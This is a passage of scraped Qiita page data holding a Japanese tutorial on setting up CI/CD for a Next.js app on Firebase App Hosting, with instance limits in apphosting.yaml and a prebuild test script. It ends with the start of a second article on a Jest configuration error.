srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F367cc7b1-de02-4ca1-b72f-acd3db3dc46d.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=3259392fd7a4e014aec05bf0caa364ee 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/367cc7b1-de02-4ca1-b72f-acd3db3dc46d.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"140:1-140:65\">firebase.jsonの配置先を入力（/を入力しました。）</p>\n<p data-sourcepos=\"142:1-142:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F110612a7-63e3-4b97-8af4-0c4596145515.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=2864293b7c4b3b4600b7657ba58ec3b6\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F110612a7-63e3-4b97-8af4-0c4596145515.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=2864293b7c4b3b4600b7657ba58ec3b6\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F110612a7-63e3-4b97-8af4-0c4596145515.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=2e6ad436057f102e9b800bc9c00397e1 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/110612a7-63e3-4b97-8af4-0c4596145515.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"144:1-144:12\">設定完了</p>\n<p data-sourcepos=\"146:1-146:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fefb50b8c-6b34-4ca1-a3a2-15d62243c7a5.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=30a0e802aef27cbdbc71dd132912a7a8\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fefb50b8c-6b34-4ca1-a3a2-15d62243c7a5.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=30a0e802aef27cbdbc71dd132912a7a8\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fefb50b8c-6b34-4ca1-a3a2-15d62243c7a5.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=bce8106912dcead1e8d6ca888496d7f4 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/efb50b8c-6b34-4ca1-a3a2-15d62243c7a5.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"149:1-149:47\">Firebase設定ファイルが作成されます</p>\n<p data-sourcepos=\"151:1-151:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F52072a40-e633-4fad-9646-6ca7e4bb17e3.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=cb79e750e9e9a6a50fcfa832b8cefe62\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F52072a40-e633-4fad-9646-6ca7e4bb17e3.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=cb79e750e9e9a6a50fcfa832b8cefe62\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F52072a40-e633-4fad-9646-6ca7e4bb17e3.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=d14b4eb22cb669314e65a3478cda1677 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/52072a40-e633-4fad-9646-6ca7e4bb17e3.png\" loading=\"lazy\"></a></p>\n<h2 data-sourcepos=\"153:1-153:44\">\n<span id=\"5バックエンドの構成管理設定\" class=\"fragment\"></span><a href=\"#5%E3%83%90%E3%83%83%E3%82%AF%E3%82%A8%E3%83%B3%E3%83%89%E3%81%AE%E6%A7%8B%E6%88%90%E7%AE%A1%E7%90%86%E8%A8%AD%E5%AE%9A\"><i class=\"fa fa-link\"></i></a>5.バックエンドの構成管理設定</h2>\n<p data-sourcepos=\"155:1-155:71\"><iframe id=\"qiita-embed-content__7db52e34fd58209fa15a3772843d283f\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__7db52e34fd58209fa15a3772843d283f\" data-content=\"https%3A%2F%2Ffirebase.google.com%2Fdocs%2Fapp-hosting%2Fconfigure%3Fhl%3Dja%26authuser%3D0\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"157:1-157:114\">インスタンスの数を設定しないと、高額請求がくる可能性があるそうです。（怖い）</p>\n<p data-sourcepos=\"159:1-159:56\"><iframe id=\"qiita-embed-content__1f83b9675142f1367b25c19c29f3691e\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__1f83b9675142f1367b25c19c29f3691e\" data-content=\"https%3A%2F%2Fqiita.com%2FSicut_study%2Fitems%2F1723379221bd966b36aa\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"161:1-161:83\">ローカルで、プロジェクト直下の<code>apphosting.yaml</code>ファイルを編集</p>\n<div class=\"code-frame\" data-lang=\"yaml\" data-sourcepos=\"163:1-187:3\">\n<div class=\"code-lang\"><span class=\"bold\">apphosting.yaml</span></div>\n<div class=\"highlight\"><pre><code><span class=\"c1\"># Settings for Backend (on Cloud Run).</span>\n<span class=\"c1\"># See https://firebase.google.com/docs/app-hosting/configure#cloud-run</span>\n<span class=\"na\">runConfig</span><span class=\"pi\">:</span>\n  <span class=\"na\">minInstances</span><span class=\"pi\">:</span> <span class=\"m\">0</span>\n  <span class=\"na\">maxInstances</span><span class=\"pi\">:</span> <span class=\"m\">2</span>\n  <span class=\"c1\"># concurrency: 80</span>\n  <span class=\"c1\"># cpu: 1</span>\n  <span class=\"c1\"># memoryMiB: 512</span>\n<span class=\"c1\"># Environment variables and secrets.</span>\n<span class=\"c1\"># env:</span>\n<span class=\"c1\"># Configure environment variables.</span>\n<span class=\"c1\"># See https://firebase.google.com/docs/app-hosting/configure#user-defined-environment</span>\n<span class=\"c1\"># - variable: MESSAGE</span>\n<span class=\"c1\">#   value: Hello world!</span>\n<span class=\"c1\">#   availability:</span>\n<span class=\"c1\">#     - BUILD</span>\n<span class=\"c1\">#     - RUNTIME</span>\n\n<span class=\"c1\"># Grant access to secrets in Cloud Secret Manager.</span>\n<span class=\"c1\"># See https://firebase.google.com/docs/app-hosting/configure#secret-parameters</span>\n<span class=\"c1\"># - variable: MY_SECRET</span>\n<span class=\"c1\">#   secret: mySecretRef</span>\n\n</code></pre></div>\n</div>\n<h2 data-sourcepos=\"189:1-189:37\">\n<span id=\"6cicdパイプラインの構築\" class=\"fragment\"></span><a href=\"#6cicd%E3%83%91%E3%82%A4%E3%83%97%E3%83%A9%E3%82%A4%E3%83%B3%E3%81%AE%E6%A7%8B%E7%AF%89\"><i class=\"fa fa-link\"></i></a>6.CI/CDパイプラインの構築</h2>\n<h3 data-sourcepos=\"192:1-192:57\">\n<span id=\"packagejsonにprebuildスクリプトを追加する\" class=\"fragment\"></span><a href=\"#packagejson%E3%81%ABprebuild%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%88%E3%82%92%E8%BF%BD%E5%8A%A0%E3%81%99%E3%82%8B\"><i class=\"fa fa-link\"></i></a>package.jsonにprebuildスクリプトを追加する</h3>\n<div class=\"code-frame\" data-lang=\"diff_json\" data-sourcepos=\"193:1-206:3\">\n<div class=\"code-lang\"><span class=\"bold\">package.json</span></div>\n<div class=\"highlight\"><pre><code><span class=\"w\"> </span><span class=\"p\">{</span>\n<span class=\"w\">   </span><span class=\"nl\">\"name\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"tech-blog\"</span><span class=\"p\">,</span>\n<span class=\"w\">   </span><span class=\"nl\">\"version\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"0.1.0\"</span><span class=\"p\">,</span>\n<span class=\"w\">   </span><span class=\"nl\">\"private\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"kc\">true</span><span class=\"p\">,</span>\n<span class=\"w\">   </span><span class=\"nl\">\"scripts\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"p\">{</span>\n<span class=\"w\">     </span><span class=\"nl\">\"dev\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"next dev --turbopack\"</span><span class=\"p\">,</span>\n<span class=\"w\">     </span><span class=\"nl\">\"build\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"next build\"</span><span class=\"p\">,</span>\n<span class=\"w\">     </span><span class=\"nl\">\"start\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"next start\"</span><span class=\"p\">,</span>\n<span class=\"w\">     </span><span class=\"nl\">\"lint\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"next lint\"</span><span class=\"p\">,</span>\n<span class=\"w\">     </span><span class=\"nl\">\"test\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"jest\"</span><span class=\"p\">,</span>\n<span class=\"hil\"><span class=\"err\">+</span><span class=\"w\">    </span><span class=\"nl\">\"prebuild\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"npm run test\"</span>\n</span><span class=\"w\">  </span><span class=\"p\">},</span>\n</code></pre></div>\n</div>\n<p data-sourcepos=\"208:1-209:183\">Firebase App Hostingの仕組みより、これまでの設定でGitHubにpushすると自動でデプロイできるようになります。<br>\nデプロイ前に、テストを実行、テストが成功した場合をトリガーにデプロイをしたかったのですが、なかなかうまくできませんでした。</p>\n<p data-sourcepos=\"212:1-212:123\">Firebase App HostingはNext.jsを検出すると、独自のビルドパイプラインを使用しているそうです。</p>\n<p data-sourcepos=\"214:1-215:115\"><strong><code>prebuild</code>は、npmがbuildスクリプトを実行する前に自動的に実行されます。</strong><br>\n（<code>preXXXX</code>の形式でスクリプトを作成するとXXXXスクリプト前に自動で実行してくれる）</p>\n<p data-sourcepos=\"217:1-217:179\">Firebase App Hostingがnpm run buildを実行する場合も同様で、prebuild時にnpm run testを指定することでビルド前のテスト実行を実現できました。</p>\n<p data-sourcepos=\"219:1-219:68\">わざとテストを失敗させたときのFirebaseコンソール</p>\n<p data-sourcepos=\"221:1-221:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F47469119-9c1c-4e99-9840-ea317f46a7dd.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=4ac5291612491999fc33ba6e92d42a9b\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F47469119-9c1c-4e99-9840-ea317f46a7dd.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=4ac5291612491999fc33ba6e92d42a9b\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F47469119-9c1c-4e99-9840-ea317f46a7dd.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=99694bdba6a749f45b2e6ff318a04b5a 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/47469119-9c1c-4e99-9840-ea317f46a7dd.png\" loading=\"lazy\"></a></p>\n<h1 data-sourcepos=\"223:1-223:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"224:1-226:97\">GitHubActions以外でもCI/CDができることを知りました。ここまでに相当時間がかかってしまいましたが、良い学びになりました。<br>\nnpmのスクリプト公式ドキュメントを調べると色々あって、少し知識の幅が広がったと感じています。<br>\npreのほかにもpostもあるそうです。今後何かに使えるかもと思いました。</p>\n<h1 data-sourcepos=\"228:1-228:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"230:1-230:62\"><iframe id=\"qiita-embed-content__49bcb75a28e3978d2168255ed0eb2ddc\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__49bcb75a28e3978d2168255ed0eb2ddc\" data-content=\"https%3A%2F%2Ffirebase.google.com%2Fdocs%2Fapp-hosting%2Fget-started%3Fhl%3Dja\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"232:1-232:71\"><iframe id=\"qiita-embed-content__c50d2390252cece5f1838dafde90c00d\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__c50d2390252cece5f1838dafde90c00d\" data-content=\"https%3A%2F%2Ffirebase.google.com%2Fdocs%2Fapp-hosting%2Fconfigure%3Fhl%3Dja%26authuser%3D0\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"234:1-234:56\"><iframe id=\"qiita-embed-content__28abf3f9e07182cfdc63c7513b03f229\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__28abf3f9e07182cfdc63c7513b03f229\" data-content=\"https%3A%2F%2Fqiita.com%2FSicut_study%2Fitems%2F1723379221bd966b36aa\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"236:1-236:54\"><iframe id=\"qiita-embed-content__1323d07d127bba85774647999acd5f26\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__1323d07d127bba85774647999acd5f26\" data-content=\"https%3A%2F%2Fqiita.com%2Frighteous%2Fitems%2Fe5448cb2e7e11ab7d477\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"238:1-238:48\"><iframe id=\"qiita-embed-content__1e9778cba756a5a9f2ae9a993c34efe6\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__1e9778cba756a5a9f2ae9a993c34efe6\" data-content=\"https%3A%2F%2Fzenn.dev%2Fdelisit%2Farticles%2F953a546ea37ab4\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"240:1-240:66\"><iframe id=\"qiita-embed-content__339ca5b116a5acb1c50f087b0697cbc5\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__339ca5b116a5acb1c50f087b0697cbc5\" data-content=\"https%3A%2F%2Fdocs.npmjs.com%2Fcli%2Fv11%2Fusing-npm%2Fscripts%23pre--post-scripts\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\nNext.jsアプリでCI/CDを構築しようとしたところ、Firebaseへのデプロイする方法がわからず、数時間格闘しました。今後のために備忘録としてまとめました。\n\n# 結論\n公式ドキュメントの通りに行えば可能でした。\n\nhttps://firebase.google.com/docs/app-hosting/get-started?hl=ja\n\n# 試してみる\n## 前提条件\nNext.jsアプリを作成、GitHubに登録済で実施しています。\n\n## 1.firebaseにアクセス\n\nhttps://firebase.google.com/?hl=ja\n\nログイン後、画面右上の`Go to console`でコンソールに移動します\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/34a3c0bc-1506-4eb0-aec6-cb9bdfd8578e.png)\n\n`Firebase プロジェクトを作成する`をクリック\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/5bea5305-d674-41fb-8673-8d43f62699f6.png)\n\nプロジェクト名を入力します\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/bee601db-28df-4fc6-aa6a-088966d894f5.png)\n\n\nここからは、任意で有効にし、続行ボタンを押下\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/ac2070c4-2b4f-4bd2-98aa-56c08fdd46c6.png)\n\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/0da79034-05cb-48f7-bcd7-7259580bc942.png)\n\n`プロジェクト作成`ボタンを押下\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/03041e9a-a8f5-4109-b6c8-fa6539100fb4.png)\n\nプロジェクト作成完了\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/73d2caa6-4012-42c6-ac53-11b26c8c2bc0.png)\n\n## 2.Blazeプランにアップグレード\n\nNext.js をFirebaseにてデプロイする（Firebase App Hosting を利用する）には有料のBlazeプランへの登録が必要です。\n\n**公式ドキュメントより引用**\n>Firebase App Hosting を設定する前に、Firebase プロジェクトを作成（まだ作成していない場合）し、Blaze プランにアップグレードする必要があります。\n\nプロジェクト作成後、左下の`アップグレード`ボタンを押下\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/cd59aad7-36c3-4dc2-aeda-bd5b627296b9.png)\n\nBlazeの`プランを選択`ボタンを押下\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/ca0c8132-0677-41b0-b294-db1540641ad3.png)\n\n`Firebaseのお支払いを選択`を押下\n（クレジットカードや住所の登録を求められます。）\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/cd2a4e3e-9134-4020-bc02-ab9112b1e011.png)\n\n予算設定額を入力\n私は100円を設定しました。利用額が超えるとアラートメールを受け取れます。\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/0665c2d3-560b-4570-95d6-4d2af84283fb.png)\n\n`Cloud 請求先アカウントをリンク`を押下\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/edf99337-116a-417f-b774-3e7ef964a960.png)\n\n登録完了\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/0e9e4bd6-d410-4e27-9eab-94148020bdf2.png)\n\n## 3.App Hostingの設定\n\nプロジェクト画面下の`すべての Firebase 機能を表示`をクリック\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/17d0a1ed-c0bd-414a-8ee4-a49e70f594b3.png)\n\n`App Hosting`をクリック\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/8881e1fa-279c-49eb-9837-a102a32949d9.png)\n\n`始める`を押下\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/f0bd43ea-f7e1-46d7-af8c-4fd21f0064dd.png)\n\n`リージョン`を選択\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/2a1a14a4-14a6-480e-b14b-f78cf7da4204.png)\n\nGitHubリポジトリをインポート\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/39fa0384-dd8f-4698-a1c4-479ba52a7fa2.png)\n\nリポジトリを選択\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/7cf8fcf9-064d-4e5d-8d24-ce4ae771044b.png)\n\nデプロイしたいブランチを選択\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/e557f31b-35dc-420b-ba66-c952af32deca.png)\n\n`終了してデプロイ`を押下\n\n\n\n## 4.プロジェクト設定ファイル作成\n\nローカルのターミナル上でコマンドを実行\n\n```shell\n$ firebase init apphosting\n```\n\n`Use an existing project`を選択\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/28a09987-653e-4ed2-bb5f-9de3e64f9689.png)\n\n`作成したプロジェクト`を選択\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/e5389b32-e6b7-4e76-aab1-044673209e2d.png)\n\n`Link to an existing backend`を選択\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/4bc1e429-de24-4411-b538-ab7c76e65da1.png)\n\nWhich backend would you ~ ?でリンクしたいバックエンドを聞かれるので、作成したバックエンド名を入力\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/887dddcc-0c8b-4a01-b660-9a3164193f71.png)\n\nFirebaseコンソールのApp Hostingを選択すると名称が載っています\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/367cc7b1-de02-4ca1-b72f-acd3db3dc46d.png)\n\nfirebase.jsonの配置先を入力（/を入力しました。）\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/110612a7-63e3-4b97-8af4-0c4596145515.png)\n\n設定完了\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/efb50b8c-6b34-4ca1-a3a2-15d62243c7a5.png)\n\n\nFirebase設定ファイルが作成されます\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/52072a40-e633-4fad-9646-6ca7e4bb17e3.png)\n\n## 5.バックエンドの構成管理設定\n\nhttps://firebase.google.com/docs/app-hosting/configure?hl=ja&authuser=0\n\nインスタンスの数を設定しないと、高額請求がくる可能性があるそうです。（怖い）\n\nhttps://qiita.com/Sicut_study/items/1723379221bd966b36aa\n\nローカルで、プロジェクト直下の`apphosting.yaml`ファイルを編集\n\n```yaml:apphosting.yaml\n# Settings for Backend (on Cloud Run).\n# See https://firebase.google.com/docs/app-hosting/configure#cloud-run\nrunConfig:\n  minInstances: 0\n  maxInstances: 2\n  # concurrency: 80\n  # cpu: 1\n  # memoryMiB: 512\n# Environment variables and secrets.\n# env:\n# Configure environment variables.\n# See https://firebase.google.com/docs/app-hosting/configure#user-defined-environment\n# - variable: MESSAGE\n#   value: Hello world!\n#   availability:\n#     - BUILD\n#     - RUNTIME\n\n# Grant access to secrets in Cloud Secret Manager.\n# See https://firebase.google.com/docs/app-hosting/configure#secret-parameters\n# - variable: MY_SECRET\n#   secret: mySecretRef\n\n```\n\n## 6.CI/CDパイプラインの構築\n\n\n### package.jsonにprebuildスクリプトを追加する\n```diff_json:package.json\n {\n   \"name\": \"tech-blog\",\n   \"version\": \"0.1.0\",\n   \"private\": true,\n   \"scripts\": {\n     \"dev\": \"next dev --turbopack\",\n     \"build\": \"next build\",\n     \"start\": \"next start\",\n     \"lint\": \"next lint\",\n     \"test\": \"jest\",\n+    \"prebuild\": \"npm run test\"\n  },\n```\n\nFirebase App Hostingの仕組みより、これまでの設定でGitHubにpushすると自動でデプロイできるようになります。\nデプロイ前に、テストを実行、テストが成功した場合をトリガーにデプロイをしたかったのですが、なかなかうまくできませんでした。\n\n\nFirebase App HostingはNext.jsを検出すると、独自のビルドパイプラインを使用しているそうです。\n\n**`prebuild`は、npmがbuildスクリプトを実行する前に自動的に実行されます。**\n（`preXXXX`の形式でスクリプトを作成するとXXXXスクリプト前に自動で実行してくれる）\n\nFirebase App Hostingがnpm run buildを実行する場合も同様で、prebuild時にnpm run testを指定することでビルド前のテスト実行を実現できました。\n\nわざとテストを失敗させたときのFirebaseコンソール\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/47469119-9c1c-4e99-9840-ea317f46a7dd.png)\n\n# おわりに\nGitHubActions以外でもCI/CDができることを知りました。ここまでに相当時間がかかってしまいましたが、良い学びになりました。\nnpmのスクリプト公式ドキュメントを調べると色々あって、少し知識の幅が広がったと感じています。\npreのほかにもpostもあるそうです。今後何かに使えるかもと思いました。\n\n# 参考\n\nhttps://firebase.google.com/docs/app-hosting/get-started?hl=ja\n\nhttps://firebase.google.com/docs/app-hosting/configure?hl=ja&authuser=0\n\nhttps://qiita.com/Sicut_study/items/1723379221bd966b36aa\n\nhttps://qiita.com/righteous/items/e5448cb2e7e11ab7d477\n\nhttps://zenn.dev/delisit/articles/953a546ea37ab4\n\nhttps://docs.npmjs.com/cli/v11/using-npm/scripts#pre--post-scripts\n","coediting":false,"comments_count":0,"created_at":"2025-07-16T21:35:01+09:00","group":null,"id":"9b951292a203cf7cdc13","likes_count":2,"private":false,"reactions_count":0,"stocks_count":0,"tags":[{"name":"デプロイ","versions":[]},{"name":"Firebase","versions":[]},{"name":"Next.js","versions":[]},{"name":"CICD","versions":[]}],"title":"【Next.js + Firebase App Hosting】Firebase App HostingでNext.jsアプリのCI/CDを構築する","updated_at":"2025-07-16T21:35:01+09:00","url":"https://qiita.com/asa129/items/9b951292a203cf7cdc13","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":559,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-2:138\">Next.jsv15で<code>Jest</code>と<code>React Testing Library</code>を設定、テスト実行をしようとしたところ、エラーが発生しました。</p>\n<h1 data-sourcepos=\"4:1-4:8\">\n<span id=\"問題\" class=\"fragment\"></span><a href=\"#%E5%95%8F%E9%A1%8C\"><i class=\"fa fa-link\"></i></a>問題</h1>\n<p data-sourcepos=\"5:1-6:134\">公式ドキュメントに沿って、Jestのテスト環境を構築<br>\n<code>npm run test</code>を実行すると<strong>Support for the experimental syntax 'jsx' isn't currently enabled</strong>エラーが発生しました。</p>\n<p data-sourcepos=\"8:1-8:106\"><iframe id=\"qiita-embed-content__4c83ff9eb51d0609b5c9bd7af1ccd39b\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__4c83ff9eb51d0609b5c9bd7af1ccd39b\" data-content=\"https%3A%2F%2Fnextjs.org%2Fdocs%2Fapp%2Fguides%2Ftesting%2Fjest%23optional-handling-absolute-imports-and-module-path-aliases\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h1 data-sourcepos=\"10:1-10:8\">\n<span id=\"原因\" class=\"fragment\"></span><a href=\"#%E5%8E%9F%E5%9B%A0\"><i class=\"fa fa-link\"></i></a>原因</h1>\n<p data-sourcepos=\"11:1-12:92\">Next.jsのプロジェクトに、通常のJestの設定を行っていたため<br>\n通常のJest設定のため、TypeScriptの変換処理ができていませんでした。</p>\n<p data-sourcepos=\"14:1-14:75\">公式ドキュメントの以下の文章を見落としていました。</p>\n<p data-sourcepos=\"16:1-16:40\"><strong>公式ドキュメントより引用</strong></p>\n<blockquote data-sourcepos=\"17:1-17:134\">\n<p data-sourcepos=\"17:2-17:134\">Update your config file to use next/jest. This transformer has all the necessary configuration options for Jest to work with Next.js:</p>\n</blockquote>\n<blockquote data-sourcepos=\"19:1-19:222\">\n<p data-sourcepos=\"19:2-19:222\">next/jestを使うように設定ファイルを更新してください。このトランスフォーマーには、JestがNext.jsで動作するために必要な設定オプションがすべて含まれています：</p>\n</blockquote>\n<h1 data-sourcepos=\"21:1-21:14\">\n<span id=\"解決方法\" class=\"fragment\"></span><a href=\"#%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95\"><i class=\"fa fa-link\"></i></a>解決方法</h1>\n<p data-sourcepos=\"22:1-22:34\"><code>jest.config.ts</code>の設定を修正</p>\n<div class=\"code-frame\" data-lang=\"diff_typescript\" data-sourcepos=\"24:1-42:3\">\n<div class=\"code-lang\"><span 